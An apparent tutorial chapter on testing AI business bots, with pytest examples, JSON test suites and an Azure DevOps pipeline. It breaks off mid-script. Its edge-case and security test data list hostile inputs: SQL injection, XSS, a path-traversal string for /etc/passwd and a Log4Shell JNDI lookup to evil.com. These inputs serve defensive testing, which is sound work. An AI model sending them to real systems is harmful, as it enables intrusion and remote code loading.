# Testing AI-Powered Business Solutions

## Overview
This section covers testing strategies, validation criteria, and test case creation for AI-powered business solutions, ensuring quality and reliability before deployment.

---

## 1. Testing Strategies for AI Solutions

### 1.1 Types of AI Testing

#### Unit Testing for AI Components

**Prompt Testing:**
```python
# Test individual prompts for expected behavior
import pytest
from azure.ai.openai import AzureOpenAI

class TestPrompts:
    def setup_method(self):
        self.client = AzureOpenAI(...)
        self.test_cases = load_test_cases("prompts/summarization_test.json")
    
    def test_document_summarization_accuracy(self):
        """Test that summarization prompt produces accurate summaries"""
        prompt_template = load_prompt("summarize_document.jinja2")
        
        for test_case in self.test_cases:
            # Generate summary
            response = self.client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": test_case["system_prompt"]},
                    {"role": "user", "content": prompt_template.render(
                        document=test_case["input_document"]
                    )}
                ]
            )
            
            summary = response.choices[0].message.content
            
            # Assert key facts are present
            for key_fact in test_case["expected_facts"]:
                assert key_fact.lower() in summary.lower(), \
                    f"Expected fact '{key_fact}' not found in summary"
            
            # Assert length constraint
            word_count = len(summary.split())
            assert word_count <= test_case["max_words"], \
                f"Summary too long: {word_count} words (max: {test_case['max_words']})"
    
    def test_prompt_handles_edge_cases(self):
        """Test prompt behavior with edge cases"""
        edge_cases = [
            {"input": "", "expected_behavior": "graceful_error"},
            {"input": "A" * 10000, "expected_behavior": "truncate_or_error"},
            {"input": "!@#$%^&*()", "expected_behavior": "handle_special_chars"},
            {"input": "非ASCII文字", "expected_behavior": "handle_unicode"}
        ]
        
        for case in edge_cases:
            try:
                response = self.client.chat.completions.create(
                    model="gpt-4-turbo",
                    messages=[{"role": "user", "content": case["input"]}]
                )
                
                # Verify it didn't crash and returned something reasonable
                assert response.choices[0].message.content is not None
                assert len(response.choices[0].message.content) > 0
                
            except Exception as e:
                # Some edge cases should error gracefully
                if case["expected_behavior"] != "graceful_error":
                    pytest.fail(f"Unexpected error: {e}")
```

**RAG Component Testing:**
```python
# Test retrieval and generation components separately
class TestRAGComponents:
    def test_retrieval_precision(self):
        """Test that retriever returns relevant documents"""
        search_client = get_azure_search_client()
        
        test_queries = [
            {
                "query": "What is the return policy?",
                "expected_doc_ids": ["POL-001", "POL-002"],
                "not_expected": ["PROD-100"]  # Product doc shouldn't match
            },
            {
                "query": "How do I reset my password?",
                "expected_doc_ids": ["FAQ-010"],
                "not_expected": ["POL-001"]
            }
        ]
        
        for test in test_queries:
            results = search_client.search(
                search_text=test["query"],
                top=5
            )
            
            retrieved_ids = [doc["id"] for doc in results]
            
            # Check expected docs are retrieved
            for expected_id in test["expected_doc_ids"]:
                assert expected_id in retrieved_ids, \
                    f"Expected document {expected_id} not retrieved for query: {test['query']}"
            
            # Check unwanted docs are not retrieved
            for unwanted_id in test["not_expected"]:
                assert unwanted_id not in retrieved_ids, \
                    f"Unwanted document {unwanted_id} was retrieved"
    
    def test_generation_with_grounding(self):
        """Test that generated answers are grounded in provided context"""
        test_cases = [
            {
                "query": "What are the office hours?",
                "context": "Our office is open Monday-Friday 9 AM to 5 PM.",
                "expected_answer_contains": ["Monday-Friday", "9 AM", "5 PM"],
                "should_not_contain": ["Saturday", "Sunday", "24/7"]
            }
        ]
        
        for test in test_cases:
            answer = generate_answer(
                query=test["query"],
                context=test["context"]
            )
            
            # Verify grounding
            for phrase in test["expected_answer_contains"]:
                assert phrase in answer, \
                    f"Answer should contain '{phrase}' from context"
            
            # Verify no hallucination
            for phrase in test["should_not_contain"]:
                assert phrase not in answer, \
                    f"Answer should not contain '{phrase}' (not in context)"
```

#### Integration Testing

**End-to-End Conversation Testing:**
```python
# Test complete conversation flows
class TestConversationFlows:
    def setup_method(self):
        self.bot_client = get_copilot_studio_client()
    
    def test_appointment_booking_flow(self):
        """Test complete appointment booking conversation"""
        conversation_id = self.bot_client.start_conversation()
        
        # Step 1: User greets bot
        response = self.bot_client.send_message(
            conversation_id,
            "Hi, I need to book an appointment"
        )
        assert "appointment" in response.lower()
        assert response contains prompt for service type or date
        
        # Step 2: User provides service type
        response = self.bot_client.send_message(
            conversation_id,
            "I need a consultation"
        )
        assert "date" in response.lower() or "when" in response.lower()
        
        # Step 3: User provides date
        response = self.bot_client.send_message(
            conversation_id,
            "Next Wednesday at 2 PM"
        )
        assert "wednesday" in response.lower()
        assert "2" in response or "2:00" in response
        assert response asks for confirmation
        
        # Step 4: User confirms
        response = self.bot_client.send_message(
            conversation_id,
            "Yes, please confirm"
        )
        assert "confirmed" in response.lower() or "booked" in response.lower()
        
        # Verify appointment was created in backend
        appointments = get_appointments_from_dataverse(
            conversation_id=conversation_id
        )
        assert len(appointments) == 1
        assert appointments[0]["service_type"] == "consultation"
    
    def test_escalation_flow(self):
        """Test that complex queries trigger escalation"""
        conversation_id = self.bot_client.start_conversation()
        
        # Send complex query that should trigger escalation
        response = self.bot_client.send_message(
            conversation_id,
            "I need to dispute a charge and also update my account information and discuss a refund"
        )
        
        # Should recognize complexity and offer human agent
        assert any([
            "agent" in response.lower(),
            "specialist" in response.lower(),
            "representative" in response.lower()
        ])
        
        # Accept escalation
        response = self.bot_client.send_message(
            conversation_id,
            "Yes, connect me to an agent"
        )
        
        # Verify escalation was logged
        transcript = self.bot_client.get_transcript(conversation_id)
        assert transcript["escalated"] == True
        assert transcript["escalation_reason"] is not None
```

**API Integration Testing:**
```python
# Test integrations with external systems
class TestAPIIntegrations:
    def test_crm_integration(self):
        """Test Copilot integration with Dynamics 365"""
        # Create test customer in CRM
        test_customer = create_test_customer({
            "name": "Test Corp",
            "email": "test@testcorp.com"
        })
        
        try:
            # Query copilot about this customer
            response = copilot_query(
                f"Tell me about {test_customer['name']}"
            )
            
            # Should retrieve customer data from CRM
            assert test_customer["name"] in response
            assert test_customer["email"] in response
            
            # Test creating opportunity via copilot
            response = copilot_action(
                f"Create an opportunity for {test_customer['name']} worth $50,000"
            )
            
            # Verify opportunity was created in CRM
            opportunities = get_opportunities_by_customer(test_customer["id"])
            assert len(opportunities) == 1
            assert opportunities[0]["estimated_value"] == 50000
            
        finally:
            # Cleanup
            delete_test_customer(test_customer["id"])
    
    def test_sharepoint_integration(self):
        """Test knowledge retrieval from SharePoint"""
        # Upload test document
        test_doc_id = upload_test_document(
            site="test-site",
            library="documents",
            filename="test-policy.docx",
            content="The maximum vacation days allowed is 25 per year."
        )
        
        try:
            # Wait for indexing
            time.sleep(30)
            
            # Query copilot
            response = copilot_query("How many vacation days do I get?")
            
            # Should retrieve info from SharePoint doc
            assert "25" in response
            assert "vacation" in response.lower()
            
            # Should cite the source
            assert "test-policy" in response or "source" in response.lower()
            
        finally:
            # Cleanup
            delete_test_document(test_doc_id)
```

#### Performance Testing

**Load Testing:**
```python
# Test system under load
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor

class TestPerformance:
    def test_concurrent_requests(self):
        """Test system handles concurrent requests"""
        num_concurrent = 50
        queries = [
            "What are your business hours?",
            "How do I return a product?",
            "Tell me about your services",
        ] * 17  # 50 total queries
        
        start_time = time.time()
        
        # Execute queries concurrently
        with ThreadPoolExecutor(max_workers=num_concurrent) as executor:
            futures = [
                executor.submit(copilot_query, query)
                for query in queries
            ]
            
            results = [future.result() for future in futures]
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Verify all succeeded
        assert len(results) == num_concurrent
        assert all(r is not None for r in results)
        
        # Check average latency
        avg_latency = duration / num_concurrent
        assert avg_latency < 5.0, f"Average latency too high: {avg_latency}s"
        
        # No requests should have failed
        errors = [r for r in results if "error" in str(r).lower()]
        assert len(errors) == 0, f"{len(errors)} requests failed"
    
    def test_rate_limiting(self):
        """Test that rate limits are enforced"""
        # Send requests rapidly
        responses = []
        for i in range(100):
            try:
                response = copilot_query(f"Test query {i}")
                responses.append({"success": True, "response": response})
            except RateLimitException as e:
                responses.append({"success": False, "error": str(e)})
        
        # Some requests should be rate limited
        successful = sum(1 for r in responses if r["success"])
        rate_limited = sum(1 for r in responses if not r["success"])
        
        # Verify rate limiting kicked in
        assert rate_limited > 0, "Rate limiting not working"
        
        # But not all should be blocked
        assert successful > 50, "Too aggressive rate limiting"
```

**Latency Testing:**
```python
# Measure response times under various conditions
class TestLatency:
    def test_simple_query_latency(self):
        """Test latency for simple queries"""
        simple_queries = [
            "Hello",
            "What are your hours?",
            "Thank you"
        ]
        
        latencies = []
        for query in simple_queries:
            start = time.time()
            response = copilot_query(query)
            latency = time.time() - start
            latencies.append(latency)
        
        avg_latency = sum(latencies) / len(latencies)
        p95_latency = sorted(latencies)[int(len(latencies) * 0.95)]
        
        # Simple queries should be fast
        assert avg_latency < 2.0, f"Simple query avg latency: {avg_latency}s"
        assert p95_latency < 3.0, f"Simple query P95 latency: {p95_latency}s"
    
    def test_complex_query_latency(self):
        """Test latency for complex queries requiring RAG"""
        complex_queries = [
            "Compare product A and product B features and pricing",
            "Summarize the last 6 months of sales data by region",
            "What are all the policies related to remote work?"
        ]
        
        latencies = []
        for query in complex_queries:
            start = time.time()
            response = copilot_query(query)
            latency = time.time() - start
            latencies.append(latency)
        
        avg_latency = sum(latencies) / len(latencies)
        p95_latency = sorted(latencies)[int(len(latencies) * 0.95)]
        
        # Complex queries can be slower but still within limits
        assert avg_latency < 8.0, f"Complex query avg latency: {avg_latency}s"
        assert p95_latency < 12.0, f"Complex query P95 latency: {p95_latency}s"
```

### 1.2 Validation Criteria

#### Quality Validation

**Groundedness Validation:**
```python
# Validate that AI responses are grounded in source data
from azure.ai.evaluation import GroundednessEvaluator

def validate_groundedness(response, source_documents, threshold=4.0):
    """
    Validate that response is grounded in source documents
    
    Returns: (is_valid, score, details)
    """
    evaluator = GroundednessEvaluator()
    
    result = evaluator.evaluate(
        response=response,
        context="\n\n".join(source_documents)
    )
    
    is_valid = result["groundedness_score"] >= threshold
    
    details = {
        "score": result["groundedness_score"],
        "threshold": threshold,
        "passed": is_valid,
        "unsupported_claims": result.get("unsupported_claims", []),
        "supported_claims": result.get("supported_claims", [])
    }
    
    return is_valid, result["groundedness_score"], details

# Example test
def test_groundedness_validation():
    source_docs = [
        "The company was founded in 2010.",
        "We have offices in Seattle, London, and Tokyo.",
        "Our main product is cloud-based CRM software."
    ]
    
    # Good response - grounded
    good_response = "The company started in 2010 and operates from three locations: Seattle, London, and Tokyo. Their primary offering is cloud CRM software."
    is_valid, score, details = validate_groundedness(good_response, source_docs)
    assert is_valid, f"Expected valid, got score {score}"
    
    # Bad response - has hallucination
    bad_response = "The company started in 2010 and has 5000 employees worldwide."
    is_valid, score, details = validate_groundedness(bad_response, source_docs)
    assert not is_valid, f"Should fail due to hallucination (5000 employees)"
    assert "5000 employees" in str(details["unsupported_claims"])
```

**Relevance Validation:**
```python
# Validate response relevance to query
from azure.ai.evaluation import RelevanceEvaluator

def validate_relevance(query, response, threshold=4.0):
    """
    Validate that response is relevant to the query
    """
    evaluator = RelevanceEvaluator()
    
    result = evaluator.evaluate(
        query=query,
        response=response
    )
    
    is_relevant = result["relevance_score"] >= threshold
    
    return is_relevant, result["relevance_score"]

# Example test
def test_relevance_validation():
    query = "What are your office hours?"
    
    # Relevant response
    relevant = "Our office is open Monday through Friday, 9 AM to 5 PM."
    is_relevant, score = validate_relevance(query, relevant)
    assert is_relevant, f"Expected relevant, got score {score}"
    
    # Irrelevant response
    irrelevant = "We offer a variety of products including software and consulting services."
    is_relevant, score = validate_relevance(query, irrelevant)
    assert not is_relevant, f"Should be irrelevant, got score {score}"
```

**Safety Validation:**
```python
# Validate content safety
from azure.ai.contentsafety import ContentSafetyClient

def validate_content_safety(text):
    """
    Check for harmful content (hate, violence, sexual, self-harm)
    """
    client = ContentSafetyClient(endpoint=endpoint, credential=credential)
    
    result = client.analyze_text(text)
    
    # Check all categories
    is_safe = True
    violations = []
    
    for category in ["hate", "violence", "sexual", "self_harm"]:
        severity = result.get(f"{category}_severity", 0)
        if severity >= 4:  # Severity 4+ is concerning
            is_safe = False
            violations.append({
                "category": category,
                "severity": severity
            })
    
    return is_safe, violations

# Example test
def test_content_safety():
    # Safe content
    safe_text = "Thank you for contacting us. How can I help you today?"
    is_safe, violations = validate_content_safety(safe_text)
    assert is_safe, f"Safe content flagged: {violations}"
    
    # Test that unsafe content would be caught
    # (using mild example for testing purposes)
    unsafe_text = "[content that would violate policies]"
    is_safe, violations = validate_content_safety(unsafe_text)
    # In production, this should fail
    # assert not is_safe
```

#### Functional Validation

**Intent Recognition Validation:**
```python
# Test that intents are correctly identified
def test_intent_recognition():
    """Validate intent classification accuracy"""
    test_cases = [
        {
            "utterance": "I want to book an appointment",
            "expected_intent": "BookAppointment",
            "confidence_threshold": 0.8
        },
        {
            "utterance": "What are your hours?",
            "expected_intent": "BusinessHours",
            "confidence_threshold": 0.8
        },
        {
            "utterance": "I need to speak with a manager",
            "expected_intent": "Escalate",
            "confidence_threshold": 0.7
        },
        {
            "utterance": "How do I reset my password?",
            "expected_intent": "PasswordReset",
            "confidence_threshold": 0.8
        }
    ]
    
    for test in test_cases:
        result = recognize_intent(test["utterance"])
        
        assert result["intent"] == test["expected_intent"], \
            f"Wrong intent for '{test['utterance']}': expected {test['expected_intent']}, got {result['intent']}"
        
        assert result["confidence"] >= test["confidence_threshold"], \
            f"Low confidence for '{test['utterance']}': {result['confidence']}"

def recognize_intent(utterance):
    """Call intent recognition service"""
    # Implementation depends on your platform
    # Copilot Studio, LUIS, or custom classifier
    response = intent_service.predict(utterance)
    return {
        "intent": response.top_intent,
        "confidence": response.top_intent_score
    }
```

**Entity Extraction Validation:**
```python
# Test entity extraction accuracy
def test_entity_extraction():
    """Validate that entities are correctly extracted"""
    test_cases = [
        {
            "utterance": "Book an appointment for next Tuesday at 3pm",
            "expected_entities": {
                "date": "next Tuesday",
                "time": "3pm"
            }
        },
        {
            "utterance": "Send invoice to john@example.com for $500",
            "expected_entities": {
                "email": "john@example.com",
                "amount": "$500"
            }
        },
        {
            "utterance": "Order 10 units of product SKU-12345",
            "expected_entities": {
                "quantity": "10",
                "product_sku": "SKU-12345"
            }
        }
    ]
    
    for test in test_cases:
        entities = extract_entities(test["utterance"])
        
        for entity_type, expected_value in test["expected_entities"].items():
            assert entity_type in entities, \
                f"Entity '{entity_type}' not found in: {test['utterance']}"
            
            assert entities[entity_type] == expected_value, \
                f"Wrong value for '{entity_type}': expected '{expected_value}', got '{entities[entity_type]}'"
```

**Action Execution Validation:**
```python
# Test that bot actions execute correctly
def test_action_execution():
    """Validate that bot actions modify backend systems correctly"""
    
    # Test: Create appointment
    conversation_id = start_conversation()
    send_message(conversation_id, "Book appointment for tomorrow at 2pm")
    send_message(conversation_id, "Yes, confirm")
    
    # Verify appointment created
    appointments = get_appointments_from_backend(date="tomorrow")
    assert len(appointments) > 0, "Appointment not created"
    
    created_appt = appointments[-1]  # Most recent
    assert "14:00" in created_appt["start_time"] or "2:00 PM" in created_appt["start_time"]
    
    # Cleanup
    delete_appointment(created_appt["id"])
    
    # Test: Send email
    conversation_id = start_conversation()
    send_message(conversation_id, "Email the sales team about product demo")
    
    # Verify email sent (check email service logs/queue)
    emails = get_sent_emails(conversation_id=conversation_id)
    assert len(emails) > 0, "Email not sent"
    assert "sales team" in emails[0]["recipients"] or "sales@" in emails[0]["to"]
    assert "demo" in emails[0]["subject"].lower() or "demo" in emails[0]["body"].lower()
```

### 1.3 Test Data Management

**Creating Test Datasets:**
```python
# Generate diverse test datasets
class TestDataGenerator:
    def generate_qa_dataset(self, size=100):
        """Generate question-answer pairs for testing"""
        dataset = []
        
        # Categories of questions
        categories = {
            "factual": [
                "What are the office hours?",
                "Where are you located?",
                "What is the return policy?"
            ],
            "procedural": [
                "How do I reset my password?",
                "How do I place an order?",
                "How do I contact support?"
            ],
            "comparative": [
                "What's the difference between plan A and plan B?",
                "Which product is better for small businesses?",
                "How do your prices compare to competitors?"
            ],
            "complex": [
                "Can you analyze my account and recommend upgrades?",
                "What would be the total cost for 50 users with premium features?",
                "Help me troubleshoot why my integration isn't working"
            ]
        }
        
        # Generate variants
        for category, templates in categories.items():
            for template in templates:
                # Create variations
                variations = self.create_variations(template)
                
                for variation in variations[:size // len(templates)]:
                    dataset.append({
                        "question": variation,
                        "category": category,
                        "expected_intent": self.infer_intent(variation),
                        "difficulty": self.assess_difficulty(category)
                    })
        
        return dataset[:size]
    
    def create_variations(self, template):
        """Create variations of a question"""
        variations = [template]
        
        # Rephrase
        variations.append(self.rephrase(template))
        
        # Add typos
        variations.append(self.add_typos(template))
        
        # Change formality
        variations.append(self.make_casual(template))
        variations.append(self.make_formal(template))
        
        return variations
    
    def generate_edge_cases(self):
        """Generate edge case test data"""
        return [
            {"input": "", "description": "Empty input"},
            {"input": " ", "description": "Whitespace only"},
            {"input": "a" * 10000, "description": "Very long input"},
            {"input": "!@#$%^&*()", "description": "Special characters only"},
            {"input": "SELECT * FROM users", "description": "SQL injection attempt"},
            {"input": "<script>alert('xss')</script>", "description": "XSS attempt"},
            {"input": "你好，我需要帮助", "description": "Non-English (Chinese)"},
            {"input": "مرحبا", "description": "Non-English (Arabic)"},
            {"input": "🤖💡📊", "description": "Emojis only"},
        ]

# Usage
generator = TestDataGenerator()
test_dataset = generator.generate_qa_dataset(size=200)
edge_cases = generator.generate_edge_cases()

# Save for reuse
import json
with open("test_data/qa_dataset.json", "w") as f:
    json.dump(test_dataset, f, indent=2)
```

**Test Data Versioning:**
```yaml
# Track test data versions alongside code
testData:
  version: "2.1.0"
  created: "2025-11-01"
  lastUpdated: "2025-11-08"
  
  datasets:
    - name: qa_baseline
      description: "Standard Q&A test cases"
      filePath: "test_data/qa_baseline_v2.json"
      size: 200
      coverage:
        factual: 30%
        procedural: 30%
        comparative: 20%
        complex: 20%
    
    - name: edge_cases
      description: "Edge cases and error conditions"
      filePath: "test_data/edge_cases_v1.json"
      size: 50
    
    - name: regression_tests
      description: "Previously failed cases"
      filePath: "test_data/regression_v2.json"
      size: 75
      notes: "Cases that failed in production and were fixed"
  
  groundTruth:
    - name: golden_dataset
      description: "Human-validated correct responses"
      filePath: "test_data/golden_responses_v2.json"
      size: 100
      validators: ["expert1@contoso.com", "expert2@contoso.com"]
      validatedDate: "2025-10-15"
```

---

## 2. Create Test Cases

### 2.1 Functional Test Cases

**Conversation Flow Test Cases:**
```json
{
  "testSuite": "ConversationFlows",
  "testCases": [
    {
      "id": "TC-CF-001",
      "name": "Happy path appointment booking",
      "description": "User books appointment successfully",
      "priority": "high",
      "steps": [
        {
          "step": 1,
          "user": "I need to book an appointment",
          "expectedIntent": "BookAppointment",
          "expectedResponse": "contains('What type of appointment')"
        },
        {
          "step": 2,
          "user": "Consultation",
          "expectedEntities": {"appointmentType": "consultation"},
          "expectedResponse": "contains('What date')"
        },
        {
          "step": 3,
          "user": "Next Monday at 2pm",
          "expectedEntities": {"date": "next Monday", "time": "2pm"},
          "expectedResponse": "contains('confirm')"
        },
        {
          "step": 4,
          "user": "Yes",
          "expectedAction": "CreateAppointment",
          "expectedResponse": "contains('confirmed') or contains('booked')",
          "verifyBackend": {
            "entity": "appointments",
            "conditions": {
              "type": "consultation",
              "status": "confirmed"
            }
          }
        }
      ],
      "teardown": "deleteCreatedAppointment"
    },
    {
      "id": "TC-CF-002",
      "name": "Appointment booking with clarification",
      "description": "User provides ambiguous date, bot clarifies",
      "priority": "medium",
      "steps": [
        {
          "step": 1,
          "user": "Book an appointment for Monday",
          "expectedResponse": "contains('Which Monday') or contains('next Monday or')"
        },
        {
          "step": 2,
          "user": "This coming Monday",
          "expectedEntities": {"date": "this Monday"},
          "expectedResponse": "contains('What time')"
        }
      ]
    },
    {
      "id": "TC-CF-003",
      "name": "Appointment booking cancellation mid-flow",
      "description": "User starts booking then cancels",
      "priority": "medium",
      "steps": [
        {
          "step": 1,
          "user": "I want to book an appointment",
          "expectedIntent": "BookAppointment"
        },
        {
          "step": 2,
          "user": "Actually, never mind",
          "expectedIntent": "Cancel",
          "expectedResponse": "contains('cancelled') or contains('help you with something else')",
          "verifyBackend": {
            "entity": "appointments",
            "expectNone": true
          }
        }
      ]
    }
  ]
}
```

**Integration Test Cases:**
```json
{
  "testSuite": "SystemIntegrations",
  "testCases": [
    {
      "id": "TC-INT-001",
      "name": "CRM Customer Lookup",
      "description": "Copilot retrieves customer data from Dynamics 365",
      "priority": "critical",
      "setup": {
        "action": "createTestCustomer",
        "data": {
          "name": "Test Corporation",
          "email": "test@testcorp.com",
          "phone": "555-0100"
        }
      },
      "steps": [
        {
          "step": 1,
          "user": "Show me information for Test Corporation",
          "expectedDataSource": "Dynamics365",
          "expectedResponse": "contains('Test Corporation') and contains('test@testcorp.com')"
        }
      ],
      "teardown": "deleteTestCustomer"
    },
    {
      "id": "TC-INT-002",
      "name": "SharePoint Knowledge Retrieval",
      "description": "Copilot finds and cites SharePoint document",
      "priority": "critical",
      "setup": {
        "action": "uploadTestDocument",
        "site": "TestSite",
        "document": {
          "name": "vacation-policy.docx",
          "content": "Employees receive 25 vacation days per year."
        },
        "waitForIndexing": 60
      },
      "steps": [
        {
          "step": 1,
          "user": "How many vacation days do employees get?",
          "expectedDataSource": "SharePoint",
          "expectedResponse": "contains('25') and contains('vacation')",
          "expectedCitation": "contains('vacation-policy')"
        }
      ],
      "teardown": "deleteTestDocument"
    },
    {
      "id": "TC-INT-003",
      "name": "Email Send Action",
      "description": "Copilot sends email via Microsoft Graph",
      "priority": "high",
      "steps": [
        {
          "step": 1,
          "user": "Send an email to sales@contoso.com about product demo",
          "expectedAction": "SendEmail",
          "expectedResponse": "contains('sent') or contains('email')"
        }
      ],
      "verify": {
        "action": "checkEmailSent",
        "to": "sales@contoso.com",
        "subjectContains": "demo",
        "withinLastMinutes": 2
      }
    }
  ]
}
```

### 2.2 Non-Functional Test Cases

**Performance Test Cases:**
```json
{
  "testSuite": "Performance",
  "testCases": [
    {
      "id": "TC-PERF-001",
      "name": "Response time for simple queries",
      "description": "Simple queries respond within 2 seconds",
      "priority": "high",
      "testType": "latency",
      "queries": [
        "Hello",
        "What are your hours?",
        "Thank you"
      ],
      "successCriteria": {
        "avgLatency": "< 2000ms",
        "p95Latency": "< 3000ms",
        "p99Latency": "< 4000ms"
      },
      "iterations": 100
    },
    {
      "id": "TC-PERF-002",
      "name": "Response time for complex queries",
      "description": "Complex queries respond within 8 seconds",
      "priority": "high",
      "testType": "latency",
      "queries": [
        "Compare our top 5 products by sales in Q4",
        "Summarize all policies related to data security",
        "Analyze customer feedback from the past month"
      ],
      "successCriteria": {
        "avgLatency": "< 8000ms",
        "p95Latency": "< 12000ms"
      },
      "iterations": 50
    },
    {
      "id": "TC-PERF-003",
      "name": "Concurrent user load",
      "description": "System handles 100 concurrent users",
      "priority": "critical",
      "testType": "load",
      "config": {
        "concurrentUsers": 100,
        "duration": "5 minutes",
        "queriesPerUser": 10
      },
      "successCriteria": {
        "successRate": "> 95%",
        "avgLatency": "< 5000ms",
        "errorRate": "< 5%",
        "cpuUtilization": "< 80%",
        "memoryUtilization": "< 75%"
      }
    },
    {
      "id": "TC-PERF-004",
      "name": "Sustained load",
      "description": "System performs consistently under sustained load",
      "priority": "high",
      "testType": "endurance",
      "config": {
        "concurrentUsers": 50,
        "duration": "2 hours",
        "queriesPerMinute": 200
      },
      "successCriteria": {
        "latencyDegradation": "< 20%",
        "errorRate": "< 2%",
        "noMemoryLeaks": true
      }
    }
  ]
}
```

**Security Test Cases:**
```json
{
  "testSuite": "Security",
  "testCases": [
    {
      "id": "TC-SEC-001",
      "name": "Authentication required",
      "description": "Unauthenticated requests are rejected",
      "priority": "critical",
      "steps": [
        {
          "action": "sendRequestWithoutAuth",
          "expectedStatusCode": 401,
          "expectedResponse": "contains('unauthorized') or contains('authentication required')"
        }
      ]
    },
    {
      "id": "TC-SEC-002",
      "name": "Data access respects permissions",
      "description": "Users can only access data they have permissions for",
      "priority": "critical",
      "setup": {
        "createUsers": [
          {
            "id": "user1",
            "role": "sales",
            "permissions": ["read:customers", "read:opportunities"]
          },
          {
            "id": "user2",
            "role": "finance",
            "permissions": ["read:invoices", "read:payments"]
          }
        ]
      },
      "steps": [
        {
          "authenticateAs": "user1",
          "query": "Show me customer data",
          "expectedResult": "success"
        },
        {
          "authenticateAs": "user1",
          "query": "Show me financial reports",
          "expectedResult": "access denied or no results"
        },
        {
          "authenticateAs": "user2",
          "query": "Show me invoice data",
          "expectedResult": "success"
        },
        {
          "authenticateAs": "user2",
          "query": "Show me customer opportunities",
          "expectedResult": "access denied or no results"
        }
      ]
    },
    {
      "id": "TC-SEC-003",
      "name": "PII is not exposed in logs",
      "description": "Sensitive data is redacted from logs",
      "priority": "high",
      "steps": [
        {
          "query": "My email is john@example.com and SSN is 123-45-6789",
          "verifyLogs": {
            "shouldNotContain": [
              "john@example.com",
              "123-45-6789"
            ],
            "shouldContain": [
              "[REDACTED_EMAIL]",
              "[REDACTED_SSN]"
            ]
          }
        }
      ]
    },
    {
      "id": "TC-SEC-004",
      "name": "Injection attack prevention",
      "description": "System sanitizes and rejects malicious inputs",
      "priority": "critical",
      "inputs": [
        "'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
      ],
      "expectedResult": "safelyHandled",
      "verifyNoSideEffects": true
    }
  ]
}
```

### 2.3 Regression Test Cases

**Regression Test Suite:**
```json
{
  "testSuite": "Regression",
  "description": "Tests for previously identified bugs",
  "testCases": [
    {
      "id": "TC-REG-001",
      "name": "Date parsing for 'next week'",
      "relatedBug": "BUG-123",
      "description": "Bot incorrectly parsed 'next week' as current week",
      "fixedIn": "v2.1.0",
      "priority": "high",
      "steps": [
        {
          "user": "Book appointment for next week",
          "expectedEntity": {
            "date": "matchesNextWeek"
          },
          "shouldNotMatch": "currentWeek"
        }
      ]
    },
    {
      "id": "TC-REG-002",
      "name": "Multiple entity extraction",
      "relatedBug": "BUG-145",
      "description": "Bot only extracted first entity when multiple present",
      "fixedIn": "v2.2.0",
      "priority": "high",
      "steps": [
        {
          "user": "Order 5 units of SKU-100 and 3 units of SKU-200",
          "expectedEntities": {
            "orders": [
              {"quantity": 5, "sku": "SKU-100"},
              {"quantity": 3, "sku": "SKU-200"}
            ]
          }
        }
      ]
    },
    {
      "id": "TC-REG-003",
      "name": "Citation accuracy",
      "relatedBug": "BUG-167",
      "description": "Bot cited wrong document source",
      "fixedIn": "v2.3.0",
      "priority": "critical",
      "setup": {
        "documents": [
          {"id": "doc1", "content": "Product A costs $100"},
          {"id": "doc2", "content": "Product B costs $200"}
        ]
      },
      "steps": [
        {
          "user": "How much is Product A?",
          "expectedResponse": "contains('$100')",
          "expectedCitation": "doc1",
          "shouldNotCite": "doc2"
        }
      ]
    }
  ]
}
```

---

## 3. Automated Testing Frameworks

### 3.1 CI/CD Integration

**Azure DevOps Pipeline:**
```yaml
# azure-pipelines.yml
trigger:
  branches:
    include:
      - main
      - develop
  paths:
    include:
      - prompts/*
      - copilot-config/*
      - src/*

pool:
  vmImage: 'ubuntu-latest'

variables:
  - group: ai-testing-secrets

stages:
  - stage: Test
    jobs:
      - job: UnitTests
        steps:
          - task: UsePythonVersion@0
            inputs:
              versionSpec: '3.11'
          
          - script: |
              pip install -r requirements-test.txt
            displayName: 'Install dependencies'
          
          - script: |
              pytest tests/unit --junitxml=test-results/unit-tests.xml --cov=src --cov-report=xml
            displayName: 'Run unit tests'
            env:
              AZURE_OPENAI_ENDPOINT: $(AZURE_OPENAI_ENDPOINT)
              AZURE_OPENAI_KEY: $(AZURE_OPENAI_KEY)
          
          - task: PublishTestResults@2
            inputs:
              testResultsFormat: 'JUnit'
              testResultsFiles: 'test-results/unit-tests.xml'
              testRunTitle: 'Unit Tests'
          
          - task: PublishCodeCoverageResults@1
            inputs:
              codeCoverageTool: 'Cobertura'
              summaryFileLocation: 'coverage.xml'
      
      - job: IntegrationTests
        dependsOn: UnitTests
        steps:
          - script: |
              pytest tests/integration --junitxml=test-results/integration-tests.xml
            displayName: 'Run integration tests'
            env:
              COPILOT_ENDPOINT: $(COPILOT_ENDPOINT)
              TEST_USER_TOKEN: $(TEST_USER_TOKEN)
          
          - task: PublishTestResults@2
            inputs:
              testResultsFormat: 'JUnit'
              testResultsFiles: 'test-results/integration-tests.xml'
              testRunTitle: 'Integration Tests'
      
      - job: QualityValidation
        dependsOn: IntegrationTests
        steps:
          - script: |
              python scripts/validate_ai_quality.py --test-dataset test_data/golden_dataset.json --threshold 4.0
            displayName: 'Validate AI quality metrics'
            env:
              AZURE_AI_EVALUATOR_ENDPOINT: $(AZURE_AI_EVALUATOR_ENDPOINT)
          
          - script: |
              if [ $? -ne 0 ]; then
                echo "Quality metrics below threshold"
                exit 1
              fi
            displayName: 'Check quality gate'
  
  - stage: Deploy
    dependsOn: Test
    condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/main'))
    jobs:
      - deployment: DeployToProduction
        environment: 'production'
        strategy:
          runOnce:
            deploy:
              steps:
                - script: |
                    # Deploy Copilot Studio bot
                    python scripts/deploy_copilot.py --environment production
                  displayName: 'Deploy to production'
```

### 3.2 Test Automation Scripts

**Automated Test Execution:**
```python
# test_runner.py
import pytest
import json
from pathlib import Path

class AITestRunner:
    def __init__(self, config_path="test_config.json"):
        with open(config_path) as f:
            self.config = json.load(f)
        
        self.results = {
            "passed": 0,
            "failed": 0,
            "skipped": 0,
            "failures": []
        }
    
    def run_all_tests(self):
        """Execute all test suites"""
        print("Starting AI solution test execution...")
        
        # Run unit tests
        print("\n=== Unit Tests ===")
        self.run_unit_tests()
        
        # Run integration tests
        print("\n=== Integration Tests ===")
        self.run_integration_tests()
        
        # Run quality validation
        print("\n=== Quality Validation ===")
        self.run_quality_validation()
        
        # Run performance tests
        print("\n=== Performance Tests ===")
